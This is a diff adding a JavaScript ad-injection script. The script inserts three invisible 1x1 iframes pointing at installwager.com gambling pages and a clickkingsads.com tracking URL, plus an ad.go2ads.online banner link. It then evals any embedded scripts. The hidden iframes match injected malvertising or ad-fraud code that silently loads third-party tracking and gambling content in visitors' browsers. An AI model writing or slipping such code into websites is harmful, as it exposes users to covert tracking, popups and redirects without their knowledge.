@@ -1,0 +1,26 @@
+function iA(el, referenceNode){referenceNode.parentNode.insertBefore(el, referenceNode.nextSibling);}
+var _e57c26e2e3bad3a='';
+_e57c26e2e3bad3a += "<iframe style=\"display:none\" src=\"https:\/\/installwager.com\/web\/acb\/uk\/bw.php\" sandbox=\"allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation\" frameborder=\"0\" width=\"1\" height=\"1\"><\/iframe>\r\n<iframe style=\"display:none\" src=\"https:\/\/clickkingsads.com\/track\/cor_ac.php?s1=928734asff2342637827\" sandbox=\"allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation\" frameborder=\"0\" width=\"1\" height=\"1\"><\/iframe>\r\n<iframe style=\"display:none\" src=\"https:\/\/installwager.com\/web\/acb\/uk\/betf.php\" sandbox=\"allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation\" frameborder=\"0\" width=\"1\" height=\"1\"><\/iframe><a target=\"_blank\" rel=\"nofollow\" href=\"https:\/\/ad.go2ads.online\/deliver\/click\/e57c26e2e3bad3a\/ea8e296029644eb?uuid=bd3e6349-5195d2c5-5e3dec90-a468-9f5c15ce&amp;vid=a2e87d68-01a4-84c5-6b90-4364d1cb5898&amp;source_id=2637827\">\n\t<img width=\"300\" height=\"250\" border=\"0\" title=\"\" alt=\"\" src=\"https:\/\/ad.go2ads.online\/images\/delivery\/1bdda97e1745ebe54402.jpg\">\n<\/a>";
+
+var mS = document.getElementById('a2e87d68-01a4-84c5-6b90-4364d1cb5898');
+if(mS === null || mS === undefined) {mS = document.currentScript;}
+
+var div = document.createElement('div')
+div.id = "a2e87d68-01a4-84c5-6b90-4364d1cb5898";
+div.innerHTML = _e57c26e2e3bad3a;
+if(mS !== null){
+    iA(div, mS);
+}
+
+//https://stackoverflow.com/questions/2592092/executing-script-elements-inserted-with-innerhtml
+var scripts = Array.prototype.slice.call(div.getElementsByTagName("script"));
+for (var i = 0; i < scripts.length; i++) {
+    if (scripts[i].src != "") {
+        var tag = document.createElement("script");
+        tag.src = scripts[i].src;
+        document.getElementsByTagName("head")[0].appendChild(tag);
+    }
+    else {
+        eval(scripts[i].innerHTML);
+    }
+}
